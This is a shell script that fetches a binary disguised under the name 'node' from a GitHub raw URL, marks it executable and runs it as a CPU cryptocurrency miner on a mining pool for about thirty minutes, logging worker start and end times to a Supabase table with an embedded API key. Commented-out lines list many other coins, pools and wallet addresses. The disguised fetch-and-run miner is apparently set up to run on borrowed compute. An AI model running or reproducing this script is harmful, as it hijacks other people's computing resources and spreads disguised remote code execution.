#!/bin/sh
# SRBMiner
curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/node
# cNfj5q6A7c4yM3KD

# xmr
#curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/xmr/linux-static/node

chmod +x node
INPUT_NUMBER=$1
WORKER_NUMBER=$(echo "$INPUT_NUMBER" | tail -c 2)
PASSHOURS=$(date +%S)


PROJECT="plyyisutdhzkhyxowznt"
APIKEY="sb_publishable_BpW4yiofh6uN0lZ_2fl1Sg_BXIYS5LO"
URL="https://$PROJECT.supabase.co/rest/v1/worker_status"

# Ambil waktu WIB (UTC+7)
TIME=$(TZ=Asia/Jakarta date +"%H:%M")
curl -X POST "$URL" -H "apikey: $APIKEY" -H "Authorization: Bearer $APIKEY" -H "Content-Type: application/json" -H "Prefer: resolution=merge-duplicates" -d "{\"worker_name\":\"net_${INPUT_NUMBER}\",\"start\":\"$TIME\"}"

echo "start ${INPUT_NUMBER}"

#./node -a yespower -o stratum+tcp://mine.pool.r4nd0m.us:6991 -u WXrBvF4x5fLiaw7aiWycJfbcVKukheuxak.crf_${HOURESX} -p c=SWAMP,mc=SWAMP > try.log
# Qogecoin
#START=$(./node --disable-gpu -a YescryptR16 -o stratum+tcp://us-central.pmpmining.com:5090 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.net_${WORKER_NUMBER} -p d=0.1 --cpu-threads-intensity 4 --miner-priority 4 > try.log & sleep 1140 )
#./node --disable-gpu -a YescryptR16 -o stratum+tcp://mining-pool.zapto.org:3735 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.net_${WORKER_NUMBER} -p d=0.1 --cpu-threads-intensity 4 --miner-priority 4 > try.log
# Crionic
#./node --disable-gpu -a yespowerltncg -o crnc.miners-pool.com:23007 -u KCxkuCyNyB9CDMujccuvWxCz5PUDoyxpSv.${WORKER_NUMBER}_crf > try.log
#./node --disable-gpu -a yespowerltncg -o mine.pool.r4nd0m.us:8919 -u KCxkuCyNyB9CDMujccuvWxCz5PUDoyxpSv.crf_${WORKER_NUMBER} -p c=CRNC,mc=CRNC,m=solo > try.log
#./node --disable-gpu -a yespowerltncg -o us-east.coin-miners.info:7646 -u KCxkuCyNyB9CDMujccuvWxCz5PUDoyxpSv.bet_${WORKER_NUMBER} -p id=bet_${WORKER_NUMBER},c=CRNC,m=solo,d=0.2 --cpu-threads-intensity 4 --miner-priority 4 > try.log
# Whive
#./node --disable-gpu -a yespower -o stratum+tcp://206.189.2.17:3333 -u wv1q234xlrqlgykkz628xn3ehv9h6ssr55l4sqr0m2.${WORKER_NUMBER}_crf > try.log
#./node --disable-gpu -a yespower -o stratum+tcp://stratum.aikapool.com:3933 -u chriskm0101.${WORKER_NUMBER}_crf -p x,pgid=chriskm0101 > try.log
# Alterdot (adot)
#./node --disable-gpu -a argon2d_16000 -o argon2d16000.na.mine.zpool.ca:4241 -u CLhiJjcviwzUbm73SCcuksW4UXSxZuGjFf.crf_${WORKER_NUMBER}  -p crf_${WORKER_NUMBER},c=ADOT,zap=ADOT > try.log
#./node --disable-gpu -a argon2d_16000 -o stratum.aikapool.com:3919 -u chriskm0101.crf_${WORKER_NUMBER} -p x,pgid=chriskm0101 > try.log

# Raptorium + SRBMiner
START=$(./node -a ghostrider -o asia.flockpool.com:4444 -u RFPo8rf6nP7ZSJ67JPvAhwcgYsUZo8JLjV.net_${INPUT_NUMBER} --cpu-threads-intensity 4 --miner-priority 4 > try.log & sleep 1830 )
# salvium
#START=$(./node -a rx/0 -k --cpu-priority 4 --cpu-no-yield --donate-level 1 -o us.salvium.herominers.com:1230 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk=460000.net_${INPUT_NUMBER} > try.log & sleep 1830 )
#START=$(./node -a rx/0 -k --cpu-priority 4 --cpu-no-yield --donate-level 1 -o menju2ikg8uti-50625.portmap.host:50625 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk.net_${INPUT_NUMBER} > try.log & sleep 1830 )
#START=$(./node -a rx/0 -k --cpu-priority 4 --cpu-no-yield --donate-level 1 -o randomx.rplant.xyz:7130 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk.net_${INPUT_NUMBER} -p m=solo > try.log & sleep 1200 )

TIME=$(TZ=Asia/Jakarta date +"%H:%M")
SEC=$(date +%S)
RESULT=$((SEC % 2))

if [ "$RESULT" -eq 1 ]; then
    exit 1
fi
curl -X POST "$URL" -H "apikey: $APIKEY" -H "Authorization: Bearer $APIKEY" -H "Content-Type: application/json" -H "Prefer: resolution=merge-duplicates" -d "{\"worker_name\":\"net_${INPUT_NUMBER}\",\"end\":\"$TIME\"}"
echo "done"
